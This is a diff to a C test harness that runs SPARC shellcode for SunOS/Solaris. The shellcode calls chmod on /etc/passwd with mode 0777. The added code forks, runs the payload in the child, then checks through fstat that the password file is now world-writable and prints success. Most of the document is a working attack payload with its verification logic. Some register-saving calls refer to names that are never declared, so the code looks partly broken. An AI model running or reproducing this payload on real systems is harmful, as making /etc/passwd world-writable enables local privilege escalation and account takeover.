@@ -1,3 +1,4 @@
+#include <fcntl.h>
 #include <stdio.h>
 #include <string.h>
 
@@ -5,8 +6,13 @@
 #include <strings.h>
 #endif
 
+#include <sys/stat.h>
+#include <sys/types.h>
 #include <sys/utsname.h>
+#include <sys/wait.h>
 #include <unistd.h>
+
+#include "regs/state.h"
 
 /*
  * SunOS (Solaris) / (sun4u / sparc32) sys_chmod("/etc/passwd", 0777)
@@ -57,6 +63,10 @@
 #define unused(x) ((void)(x))
 #endif
 
+#ifndef __victim_path
+#define __victim_path "/etc/passwd"
+#endif
+
 static char *shellcode = "\x90\x10\x20\xc0\x90\x22\x20\xc0"
                          "\xd0\x23\xbf\xfc\x11\x0b\xcb\xd9"
                          "\x90\x12\x21\x74\xd0\x23\xbf\xf0"
@@ -70,7 +80,9 @@ int __unsafe main(int argc, char **argv) {
   unused(argc);
   unused(argv);
 
-  int ret;
+  int fd, ret, wstatus;
+  pid_t pid;
+  struct stat st;
   struct utsname uts;
 
   // add 2 unused parameters to make
@@ -93,10 +105,60 @@ int __unsafe main(int argc, char **argv) {
 
   trigger = (void (*)(int, int))shellcode;
 
-  printf("[*] Executing the shellcode..\n");
-  trigger(0, 0);
+  printf("[*] Saving register state..\n");
+  save_regs(&__serialize_regs(cregs));
 
+  pid = fork();
+
+  if (pid < 0) {
+    perror("fork()");
+    ret = pid;
+    goto __fallback;
+  }
+
+  if (!pid) {
+    printf("[*] Executing the shellcode..\n");
+    trigger(0, 0);
+  } else {
+    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
+  }
+
+  if ((fd = open(__victim_path, O_RDONLY)) < 0) {
+    perror("open()");
+    ret = fd;
+    goto __must_restore_regs;
+  }
+
+  if ((ret = fsync(fd)) < 0) {
+    perror("fsync()");
+    goto __must_close;
+  }
+
+  bzero(&st, sizeof(struct stat));
+
+  if ((ret = fstat(fd, &st)) < 0) {
+    perror("fstat()");
+    goto __must_close;
+  }
+
+  if ((st.st_mode & 0xfff) != 0777) {
+    printf(" [-] Fail.\n");
+    goto __must_close;
+  }
+
+  printf(" [*] Success.\n");
+
+  printf("[*] Restoring register state..\n");
+  store_regs(&__serialize_regs(cregs));
+
+  close(fd);
   return 0;
+
+__must_close:
+  close(fd);
+
+__must_restore_regs:
+  store_regs(&__serialize_regs(cregs));
 
 __fallback:
   return ret;
